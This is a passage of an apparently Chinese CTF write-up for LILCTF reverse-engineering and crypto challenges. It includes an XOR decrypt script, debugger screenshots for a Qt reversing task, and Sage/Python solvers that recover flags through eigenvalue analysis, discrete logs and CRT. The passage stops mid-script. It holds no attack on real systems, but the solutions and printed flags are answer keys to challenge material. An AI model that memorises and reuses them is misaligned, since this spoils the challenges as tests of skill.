0x4A,</span></span><br><span class="line">        <span class="comment"># 0xB9, 0x0E, 0x1A, 0x33, 0x32, 0xF4, 0x4D, 0x30, 0x68, 0x65,</span></span><br><span class="line">        <span class="comment"># 0xD6, 0xCD, 0x1E, 0xA8, 0x94, 0x3E, 0x85, 0x0B, 0x05, 0xC2</span></span><br><span class="line">        <span class="number">0x5C</span>, <span class="number">0xAF</span>, <span class="number">0xB0</span>, <span class="number">0x1C</span>, <span class="number">0xFC</span>, <span class="number">0xef</span>, <span class="number">0xc7</span>, <span class="number">0x8D</span>, <span class="number">0x1</span>, <span class="number">0xcf</span>,</span><br><span class="line">        <span class="number">0x0</span>, <span class="number">0x39</span>, <span class="number">0x94</span>, <span class="number">0xbc</span>, <span class="number">0x47</span>, <span class="number">0x2f</span>, <span class="number">0x0e</span>, <span class="number">0x7c</span>, <span class="number">0xa8</span>, <span class="number">0x8f</span>,</span><br><span class="line">        <span class="number">0x7f</span>, <span class="number">0xc9</span>, <span class="number">0xd2</span>, <span class="number">0xfa</span>, <span class="number">0xf8</span>, <span class="number">0x3f</span>, <span class="number">0x81</span>, <span class="number">0xfd</span>, <span class="number">0xa6</span>, <span class="number">0xaa</span>,</span><br><span class="line">        <span class="number">0x6</span>, <span class="number">0x1c</span>, <span class="number">0xcc</span>, <span class="number">0x7b</span>, <span class="number">0x40</span>, <span class="number">0xeb</span>, <span class="number">0x53</span>, <span class="number">0xdc</span>, <span class="number">0xdd</span>, <span class="number">0x1b</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="comment"># 异或密钥（需要替换为实际密钥）</span></span><br><span class="line">    xor_key = [</span><br><span class="line">        <span class="number">0x76</span>,<span class="number">0x4c</span>,<span class="number">0xB8</span>,<span class="number">0x7D</span>,<span class="number">0x64</span>,<span class="number">0x47</span>,<span class="number">0xf8</span>,<span class="number">0x50</span>,<span class="number">0xa7</span>,<span class="number">0x43</span>,</span><br><span class="line">        <span class="number">0xc8</span>,<span class="number">0x33</span>,<span class="number">0x87</span>,<span class="number">0x67</span>,<span class="number">0xd4</span>,<span class="number">0x69</span>,<span class="number">0x7e</span>,<span class="number">0x4c</span>,<span class="number">0x41</span>,<span class="number">0x61</span>,</span><br><span class="line">        <span class="number">0x64</span>,<span class="number">0x40</span>,<span class="number">0xa5</span>,<span class="number">0xf</span>,<span class="number">0x13</span>,<span class="number">0x4d</span>,<span class="number">0xa9</span>,<span class="number">0x7f</span>,<span class="number">0xf9</span>,<span class="number">0x21</span>,</span><br><span class="line">        <span class="number">0xc0</span>,<span class="number">0x5c</span>,<span class="number">0x76</span>,<span class="number">0x17</span>,<span class="number">0x9e</span>,<span class="number">0x75</span>,<span class="number">0xfd</span>,<span class="number">0x1</span>,<span class="number">0x4c</span>,<span class="number">0x33</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 确保密文和密钥长度一致</span></span><br><span class="line">    min_len = <span class="built_in">min</span>(<span class="built_in">len</span>(ciphertext), <span class="built_in">len</span>(xor_key))</span><br><span class="line">    ciphertext = ciphertext[:min_len]</span><br><span class="line">    xor_key = xor_key[:min_len]</span><br><span class="line"></span><br><span class="line">    flag = decrypt(ciphertext, xor_key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密结果:&quot;</span>, flag)</span><br></pre></td></tr></table></figure><h2 id="Qt-Creator"><a href="#Qt-Creator" class="headerlink" title="Qt_Creator"></a>Qt_Creator</h2><p>动调，只要下对断点就很简单了</p><p>这里是flag正确的逻辑</p><p><img src="/2025/08/18/LILCTF-Re-Crypto/image-20250818093318573.png" alt="image-20250818093318573"></p><p>这里是与flag比较函数</p><p><img src="/2025/08/18/LILCTF-Re-Crypto/image-20250818093355101.png" alt="image-20250818093355101"></p><p>进入这个函数</p><p><img src="/2025/08/18/LILCTF-Re-Crypto/image-20250818093621670.png" alt="image-20250818093621670"></p><p>发现这里校验flag长度是否为0x25,否则就退出，重新输入</p><p>然后flag就出现了</p><p><img src="/2025/08/18/LILCTF-Re-Crypto/image-20250818093804103.png" alt="image-20250818093804103"></p><h2 id="Oh-My-Uboot"><a href="#Oh-My-Uboot" class="headerlink" title="Oh_My_Uboot"></a>Oh_My_Uboot</h2><p>##########</p><p>第一次尝试逆向iot，虽然做了一天还是没做出来</p><p>过段时间可以复现</p><p>##########</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ez-math"><a href="#ez-math" class="headerlink" title="ez_math"></a>ez_math</h2><p>先分析是怎么加密的</p><p>先把flag括号里的内容分为两个大整数lambda1和lambda2</p><p>生成一个512位的素数p作为有限域的模数，生成两个128位素数的二维向量v1和v2</p><p>矩阵A由v1和v2作为行向量构成，矩阵B由v1乘以lambda1和v2乘以lambda2构成</p><p>C &#x3D; A⁻¹ × B，因为B是A的每行分别乘以不同λ值得到的，这个运算实际上会得到一个对角矩阵，对角线元素就是lambda1和lambda2</p><p>但是C并不是对角矩阵，求解特征值，矩阵 C的特征值 λ 满足：<em>λ</em>2−tr(<em>C</em>)<em>λ</em>+det(<em>C</em>)&#x3D;0</p><p><code>tr(C) = C[0][0] + C[1][1]</code>（迹）<br><code>det(C) = C[0][0] * C[1][1] - C[0][1] * C[1][0]</code>（行列式）</p><p>完整脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># Tonelli–Shanks 算法求模平方根</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modular_sqrt</span>(<span class="params">a, p</span>):</span><br><span class="line">    a %= p</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(a, (p - <span class="number">1</span>) // <span class="number">2</span>, p) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">pow</span>(a, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">    q, s = p - <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> q % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        q //= <span class="number">2</span></span><br><span class="line">        s += <span class="number">1</span></span><br><span class="line">    z = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">pow</span>(z, (p - <span class="number">1</span>) // <span class="number">2</span>, p) != p - <span class="number">1</span>:</span><br><span class="line">        z += <span class="number">1</span></span><br><span class="line">    m, c, t, r = s, <span class="built_in">pow</span>(z, q, p), <span class="built_in">pow</span>(a, q, p), <span class="built_in">pow</span>(a, (q + <span class="number">1</span>) // <span class="number">2</span>, p)</span><br><span class="line">    <span class="keyword">while</span> t != <span class="number">1</span>:</span><br><span class="line">        i, t2i = <span class="number">1</span>, <span class="built_in">pow</span>(t, <span class="number">2</span>, p)</span><br><span class="line">        <span class="keyword">while</span> i &lt; m <span class="keyword">and</span> t2i != <span class="number">1</span>:</span><br><span class="line">            t2i = <span class="built_in">pow</span>(t2i, <span class="number">2</span>, p)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        b = <span class="built_in">pow</span>(c, <span class="number">1</span> &lt;&lt; (m - i - <span class="number">1</span>), p)</span><br><span class="line">        m = i</span><br><span class="line">        c = b * b % p</span><br><span class="line">        t = t * c % p</span><br><span class="line">        r = r * b % p</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的 p 和 C</span></span><br><span class="line">p = <span class="number">9620154777088870694266521670168986508003314866222315790126552504304846236696183733266828489404860276326158191906907396234236947215466295418632056113826161</span></span><br><span class="line">a = <span class="number">7062910478232783138765983170626687981202937184255408287607971780139482616525215270216675887321965798418829038273232695370210503086491228434856538620699645</span></span><br><span class="line">b = <span class="number">7096268905956462643320137667780334763649635657732499491108171622164208662688609295607684620630301031789132814209784948222802930089030287484015336757787801</span></span><br><span class="line">c = <span class="number">7341430053606172329602911405905754386729224669425325419124733847060694853483825396200841609125574923525535532184467150746385826443392039086079562905059808</span></span><br><span class="line">d = <span class="number">2557244298856087555500538499542298526800377681966907502518580724165363620170968463050152602083665991230143669519866828587671059318627542153367879596260872</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 计算迹和行列式</span></span><br><span class="line">trace = (a + d) % p</span><br><span class="line">det = (a * d - b * c) % p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 判别式</span></span><br><span class="line">disc = (trace * trace - <span class="number">4</span> * det) % p</span><br><span class="line">sqrt_disc = modular_sqrt(disc, p)</span><br><span class="line"><span class="keyword">if</span> sqrt_disc <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;判别式在 GF(p) 下没有平方根&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 特征值（lambda1, lambda2）</span></span><br><span class="line">inv2 = <span class="built_in">pow</span>(<span class="number">2</span>, p - <span class="number">2</span>, p)</span><br><span class="line">lambda1 = (trace + sqrt_disc) * inv2 % p</span><br><span class="line">lambda2 = (trace - sqrt_disc) * inv2 % p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 取较小代表（原本是bytes_to_long，值不会很大）</span></span><br><span class="line">lambda1 = <span class="built_in">min</span>(lambda1, p - lambda1)</span><br><span class="line">lambda2 = <span class="built_in">min</span>(lambda2, p - lambda2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 转成字节</span></span><br><span class="line">part1 = long_to_bytes(lambda1)</span><br><span class="line">part2 = long_to_bytes(lambda2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;lambda1:&quot;</span>, lambda1, part1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;lambda2:&quot;</span>, lambda2, part2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag 可能为:&quot;</span>, <span class="string">b&quot;LILCTF&#123;&quot;</span> + part2 + part1 + <span class="string">b&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#LILCTF&#123;It_w4s_the_be5t_of_times_1t_wa5_the_w0rst_of_t1me5&#125;</span></span><br></pre></td></tr></table></figure><h2 id="mid-math"><a href="#mid-math" class="headerlink" title="mid_math"></a>mid_math</h2><p>分析题目给的加密过程</p><ol><li>参数生成：<ul><li>生成一个64位的素数 p，并定义在 GF(p)下的运算</li><li>生成一个随机的密钥 key，范围在 2^62 到 p之间</li><li>生成五个64位的素数向量 <code>v1, v2, v3, v4, v5</code></li><li>生成四个64位的素数 <code>a, b, c, d</code>，以及 <code>e = 0</code></li></ul></li><li>矩阵构造：<ul><li>构造矩阵 <code>A</code>，其行向量为 <code>v1, v2, v3, v4, v5</code></li><li>构造矩阵 <code>B</code>，其行向量为 <code>v1*a, v2*b, v3*c, v4*d, v5*e</code></li><li>计算 <code>C = A.inverse() * B</code></li><li>计算 <code>D = C ** key</code></li></ul></li><li>加密：<ul><li>将 key转换为字节并填充到16字节，作为AES的密钥</li><li>使用AES ECB模式加密填充后的 flag</li></ul></li></ol><p>所以现在我们要恢复key,然后解密msg</p><p>C &#x3D; A.inverse() * B,它的特征值就是{a,b,c,d,0} ,D&#x3D;C^key，所以它的特征值是 {a^key,b^key,c^key,d^key,0}</p><p>eigens &#x3D; C.eigenspaces_right() 对 C 做右特征分解，得到每个特征值 λ 及其对应的特征空间。这些 λ 应该就是 a,b,c,d,0,然后利用这些特征向量去作用在 D 上</p><p>Dv &#x3D; D * v   mu &#x3D; Dv[i] &#x2F; v[i]</p><p>这样得到的 μ 就是 D 在同一个特征向量上的特征值,配对出 (λ, μ) &#x3D; (λ, λ^key)</p><p>解μ≡λ^key(modp)，找到两种方法：</p><p>1.以 λ 为底直接做离散对数key≡logλ(μ)(modn)，拿到多对（λi,μi）就得到多条同余<br> key≡ki ( mod  ni)，再用 CRT合并，找出符合区间的key值</p><p>2.换到群的一个生成元 g 上,得到的是一条弱一些的同余（模数是 (p−1)&#x2F;d）。对多对 (λ,μ)得到多条同余，用广义 CRT合并,找出符合区间的key值</p><p>完整脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========= paste/keep instance data here =========</span></span><br><span class="line">p = <span class="number">14668080038311483271</span></span><br><span class="line">C_list = [[<span class="number">11315841881544731102</span>, <span class="number">2283439871732792326</span>, <span class="number">6800685968958241983</span>, <span class="number">6426158106328779372</span>, <span class="number">9681186993951502212</span>],</span><br><span class="line">          [<span class="number">4729583429936371197</span>, <span class="number">9934441408437898498</span>, <span class="number">12454838789798706101</span>, <span class="number">1137624354220162514</span>, <span class="number">8961427323294527914</span>],</span><br><span class="line">          [<span class="number">12212265161975165517</span>, <span class="number">8264257544674837561</span>, <span class="number">10531819068765930248</span>, <span class="number">4088354401871232602</span>, <span class="number">14653951889442072670</span>],</span><br><span class="line">          [<span class="number">6045978019175462652</span>, <span class="number">11202714988272207073</span>, <span class="number">13562937263226951112</span>, <span class="number">6648446245634067896</span>, <span class="number">13902820281072641413</span>],</span><br><span class="line">          [<span class="number">1046075193917103481</span>, <span class="number">3617988773170202613</span>, <span class="number">3590111338369894405</span>, <span class="number">2646640112163975771</span>, <span class="number">5966864698750134707</span>]]</span><br><span class="line"></span><br><span class="line">D_list = [[<span class="number">1785348659555163021</span>, <span class="number">3612773974290420260</span>, <span class="number">8587341808081935796</span>, <span class="number">4393730037042586815</span>, <span class="number">10490463205723658044</span>],</span><br><span class="line">          [<span class="number">10457678631610076741</span>, <span class="number">1645527195687648140</span>, <span class="number">13013316081830726847</span>, <span class="number">12925223531522879912</span>, <span class="number">5478687620744215372</span>],</span><br><span class="line">          [<span class="number">9878636900393157276</span>, <span class="number">13274969755872629366</span>, <span class="number">3231582918568068174</span>, <span class="number">7045188483430589163</span>, <span class="number">5126509884591016427</span>],</span><br><span class="line">          [<span class="number">4914941908205759200</span>, <span class="number">7480989013464904670</span>, <span class="number">5860406622199128154</span>, <span class="number">8016615177615097542</span>, <span class="number">13266674393818320551</span>],</span><br><span class="line">          [<span class="number">3005316032591310201</span>, <span class="number">6624508725257625760</span>, <span class="number">7972954954270186094</span>, <span class="number">5331046349070112118</span>, <span class="number">6127026494304272395</span>]]</span><br><span class="line"></span><br><span class="line">msg = <span class="string">b&quot;\xcc]B:\xe8\xbc\x91\xe2\x93\xaa\x88\x17\xc4\xe5\x97\x87@\x0fd\xb5p\x81\x1e\x98,Z\xe1n`\xaf\xe0%:\xb7\x8aD\x03\xd2Wu5\xcd\xc4#m&#x27;\xa7\xa4\x80\x0b\xf7\xda8\x1b\x82k#\xc1gP\xbd/\xb5j&quot;</span></span><br><span class="line"><span class="comment"># ================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge_congruence</span>(<span class="params">a1, m1, a2, m2</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Solve x ≡ a1 (mod m1), x ≡ a2 (mod m2) for possibly non-coprime moduli.</span></span><br><span class="line"><span class="string">    Returns (a, M) with M = lcm(m1, m2). Raises ValueError if inconsistent.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    g = gcd(m1, m2)</span><br><span class="line">    <span class="keyword">if</span> (a2 - a1) % g != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Inconsistent congruences in CRT merge.&quot;</span>)</span><br><span class="line">    <span class="comment"># Reduce to coprime case</span></span><br><span class="line">    m1p = m1 // g</span><br><span class="line">    m2p = m2 // g</span><br><span class="line">    <span class="comment"># Find t s.t. a1 + m1 * t ≡ a2 (mod m2)</span></span><br><span class="line">    <span class="comment"># =&gt; m1 * t ≡ (a2 - a1) (mod m2)</span></span><br><span class="line">    <span class="comment"># Divide both sides by g: m1p * t ≡ (a2 - a1)/g (mod m2p)</span></span><br><span class="line">    rhs = ((a2 - a1) // g) % m2p</span><br><span class="line">    inv = inverse_mod(m1p % m2p, m2p)</span><br><span class="line">    t = (rhs * inv) % m2p</span><br><span class="line">    a = (a1 + m1 * t) % (m1 * m2p)   <span class="comment"># modulus = lcm = m1 * (m2//g)</span></span><br><span class="line">    M = m1 * m2p</span><br><span class="line">    <span class="keyword">return</span> a, M</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    P = GF(p)</span><br><span class="line">    order = p - <span class="number">1</span>  <span class="comment"># |F_p^*|</span></span><br><span class="line">    C = Matrix(P, C_list)</span><br><span class="line">    D = Matrix(P, D_list)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1) Eigendecomposition over the right side</span></span><br><span class="line">    eigens = C.eigenspaces_right()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2) For each eigenpair, compute mu s.t. D*v = mu*v</span></span><br><span class="line">    pairs = []</span><br><span class="line">    <span class="keyword">for</span> lam, E <span class="keyword">in</span> eigens:</span><br><span class="line">        <span class="comment"># Use a basis vector</span></span><br><span class="line">        v = E.basis()[<span class="number">0</span>]</span><br><span class="line">        Dv = D * v</span><br><span class="line">        mu = <span class="literal">None</span></span><br><span class="line">        <span class="comment"># find a coordinate where v[i] != 0 to define mu</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v)):</span><br><span class="line">            <span class="keyword">if</span> v[i] != <span class="number">0</span>:</span><br><span class="line">                mu = Dv[i] / v[i]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> mu <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># sanity: check Dv == mu * v</span></span><br><span class="line">        <span class="keyword">if</span> Dv != mu * v:</span><br><span class="line">            <span class="comment"># numerical issues shouldn&#x27;t happen in finite field; skip if inconsistent</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        pairs.append((lam, mu))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Drop zero eigenvalue (not in multiplicative group)</span></span><br><span class="line">    pairs = [(lam, mu) <span class="keyword">for</span> lam, mu <span class="keyword">in</span> pairs <span class="keyword">if</span> lam != <span class="number">0</span> <span class="keyword">and</span> mu != <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pairs:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;No usable (lambda, mu) pairs found.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3) Discrete logs with a true generator</span></span><br><span class="line">    g = P.multiplicative_generator()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_dlog</span>(<span class="params">x</span>):</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="comment"># Let Sage choose a robust algorithm; ord enforces the group order</span></span><br><span class="line">        <span class="keyword">return</span> discrete_log(x, g, <span class="built_in">ord</span>=order, operation=<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    residues = []</span><br><span class="line">    moduli = []</span><br><span class="line">    <span class="keyword">for</span> lam, mu <span class="keyword">in</span> pairs:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = safe_dlog(lam)  <span class="comment"># lam = g^r</span></span><br><span class="line">            s = safe_dlog(mu)   <span class="comment"># mu  = g^s</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="comment"># Skip rare failures</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Reduce by gcd to avoid inverse_mod failure</span></span><br><span class="line">        g_rs = gcd(r, order)</span><br><span class="line">        mod = order // g_rs</span><br><span class="line">        r_red = r // g_rs</span><br><span class="line">        s_red = s // g_rs</span><br><span class="line">        inv_r = inverse_mod(r_red % mod, mod)</span><br><span class="line">        key_part = (s_red * inv_r) % mod</span><br><span class="line"></span><br><span class="line">        residues.append(<span class="built_in">int</span>(key_part))</span><br><span class="line">        moduli.append(<span class="built_in">int</span>(mod))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> residues:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;No discrete-log constraints gathered.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4) Merge all congruences via generalized CRT</span></span><br><span class="line">    a, M = residues[<span class="number">0</span>], moduli[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> b, N <span class="keyword">in</span> <span class="built_in">zip</span>(residues[<span class="number">1</span>:], moduli[<span class="number">1</span>:]):</span><br><span class="line">        a, M = merge_congruence(a, M, b, N)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Since every constraint comes from the same true key, final modulus should divide (p-1)</span></span><br><span class="line">    <span class="comment"># We ultimately want key mod (p-1), so lift &#x27;a (mod M)&#x27; to modulus (p-1)</span></span><br><span class="line">    <span class="keyword">if</span> M != order:</span><br><span class="line">        <span class="comment"># Extend to modulus p-1 by adding the trivial congruence x ≡ a (mod M), x ≡ ? (mod (p-1))</span></span><br><span class="line">        <span class="comment"># This simply means key ≡ a (mod M); all solutions are a + t*M, t∈Z.</span></span><br><span class="line">        <span class="comment"># We&#x27;ll handle the final lifting into [2^62, p] directly from this residue/modulus pair.</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    key_mod = a</span><br><span class="line">    key_modulus = M  <span class="comment"># may be equal to p-1, or a divisor</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] key ≡ <span class="subst">&#123;key_mod&#125;</span> (mod <span class="subst">&#123;key_modulus&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 5) Lift key into [2^62, p]</span></span><br><span class="line">    lo = <span class="number">2</span>**<span class="number">62</span></span><br><span class="line">    hi = p</span><br><span class="line">    <span class="comment"># Solutions are: key = key_mod + t*key_modulus</span></span><br><span class="line">    <span class="comment"># Among those, we also know key ≡ ? (mod p-1). If key_modulus != p-1,</span></span><br><span class="line">    <span class="comment"># the true key still satisfies the weaker congruence; search t so that lo &lt;= key &lt;= hi</span></span><br><span class="line">    t_min = Integer(ceil((lo - key_mod) / key_modulus))</span><br><span class="line">    key_candidate = <span class="built_in">int</span>(key_mod + t_min * key_modulus)</span><br><span class="line">    <span class="keyword">if</span> key_candidate &lt; lo <span class="keyword">or</span> key_candidate &gt; hi:</span><br><span class="line">        <span class="comment"># try next t just in case of boundary conditions</span></span><br><span class="line">        key_candidate2 = key_candidate + key_modulus</span><br><span class="line">        <span class="keyword">if</span> lo &lt;= key_candidate2 &lt;= hi:</span><br><span class="line">            key_candidate = key_candidate2</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;Failed to lift key into [2^62, p]; check inputs.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] lifted key = <span class="subst">&#123;key_candidate&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 6) AES-ECB decrypt with key_bytes = pad(long_to_bytes(key), 16)</span></span><br><span class="line">    key_bytes = pad(long_to_bytes(key_candidate), <span class="number">16</span>)</span><br><span class="line">    aes = AES.new(key_bytes, AES.MODE_ECB)</span><br><span class="line">    pt_padded = aes.decrypt(msg)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Unpad with block size 64 as per challenge (flag padded to 64 before encrypt)</span></span><br><span class="line">    flag = unpad(pt_padded, <span 